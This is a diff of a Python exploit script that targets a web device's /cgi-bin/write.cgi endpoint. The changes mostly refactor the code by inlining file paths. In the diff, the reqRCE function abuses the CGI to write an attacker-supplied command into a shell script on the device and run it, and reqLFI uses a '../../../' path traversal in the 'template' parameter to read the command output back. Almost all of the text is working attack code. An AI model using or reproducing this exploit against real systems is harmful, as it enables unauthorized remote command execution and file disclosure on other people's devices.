@@ -2,7 +2,7 @@
 import sys
 import requests
 import argparse
-# dependencia: requests_toolbelt
+# dependencia: "requests_toolbelt"
 # pip install requests-toolbelt
 from requests_toolbelt import MultipartEncoder
 
@@ -57,10 +57,7 @@ headers = {}
 
 host 		= 	"http://"+HST+":"+str(port)+"/"
 fullHost 	= 	"http://"+HST+":"+str(port)+"/cgi-bin/write.cgi"
-#fullHost 	= 	"http://"+HST+":"+str(8080)+"/cgi-bin/write.cgi"
 
-cowShell  = '/home/httpd/pageimages/cowTeam.sh'
-cmdOut    = "/home/httpd/cmdOut.txt"
 
 print Colors.GREEN+details+Colors.DEFAULT
 
@@ -68,13 +65,13 @@ def reqRCE(xCookie, xCommand):
 
 	thePost = MultipartEncoder(fields={
 											'script1'	: 'file', 
-											'filename1'	: cowShell,
+											'filename1'	: '/home/httpd/pageimages/cowTeam.sh',
 											'maxsize1'	: '9100', 
 
-											'content1'	: '/bin/'+xCommand+' >'+cmdOut, # litle bash script
+											'content1'	: '/bin/'+xCommand+' >'+"/home/httpd/cmdOut.txt", # litle bash script
 
 											'script2'	: 'execute',
-											'path2'		: 'sh '+cowShell
+											'path2'		: 'sh '+'/home/httpd/pageimages/cowTeam.sh'
 										})
 	contentType = len(str(thePost))
 
@@ -88,16 +85,8 @@ def reqRCE(xCookie, xCommand):
 	headers["Content-Length"]	=  str(contentType)
 	headers["Content-Type"] 	= thePost.content_type
 
-#	try:
 	r1 = requests.post(fullHost, data=thePost,headers=headers)#,timeout=9915.000)
-	theRce = r1.text
-#	except Exception:
-#		print "timeout"
-#		sys.exit(0)
-
-	print "\nok..."
-	return theRce
-
+	return r1.text
 
 testReq = reqRCE(cookie, cmd)
 
@@ -109,8 +98,8 @@ print Colors.BLUE+testReq+Colors.DEFAULT
 
 def reqLFI(hst):#, port):
 
-	uriPath = "/cgi-bin/write.cgi"
-	LFI 	= "../../../../../../"+cmdOut
+	#uriPath = "/cgi-bin/write.cgi"
+	LFI 	= "../../../../../../home/httpd/cmdOut.txt"
 
 	lenLFI = int(len(LFI))
 	ContLen = str(16+lenLFI)
@@ -125,11 +114,9 @@ def reqLFI(hst):#, port):
 	headers["Content-Type"] 	= "application/x-www-form-urlencoded"
 
 	theP0st = "page=/&template="+LFI
+
 	r2 = requests.post(fullHost, data=theP0st,headers=headers)
-
-	x2_Output = r2.text
-
-	return x2_Output
+	return r2.text
 
 command = reqLFI(HST)#,port)
 
